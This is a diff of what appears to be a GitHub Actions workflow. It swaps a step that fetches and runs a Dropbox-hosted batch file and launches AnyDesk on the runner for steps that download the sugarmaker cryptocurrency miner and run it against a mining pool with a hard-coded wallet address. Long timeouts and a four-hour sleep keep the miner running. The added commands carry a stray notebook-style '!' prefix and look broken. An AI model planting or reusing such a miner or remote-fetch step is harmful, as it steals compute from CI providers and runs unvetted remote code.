@@ -5,18 +5,20 @@ on:
 
 jobs:
   build:
-    name: Start Building...
-    runs-on: windows-latest
+    name: SUGAR
+    runs-on: ubuntu-latest
     timeout-minutes: 9999
     
     steps:
       - name: Downloading & Installing Essentials
         run: |
-          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/qdyd4p9t6xoabl95n5o3g/Downloads.bat?rlkey=snr74vv1vr8k5suujugvrhjtm&dl=1" -OutFile "Downloads.bat"
-          cmd /c Downloads.bat
+          !wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip
+          !unzip sugarmaker-v2.5.0-sugar4-linux64.zip
 
-      - name: Log In To AnyDesk
-        run: cmd /c show.bat
+      - name: Start
+        run: |
+          !./sugarmaker-v2.5.0-sugar4-linux64/sugarmaker -a YespowerSugar -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1q9weaynzepyzkhrh72hl6deh0ua5wf4f8cz8mve -t2
 
       - name: Time Counter
-        run: Start-Sleep -Seconds 14400
+        run: |
+          !sleep 14400
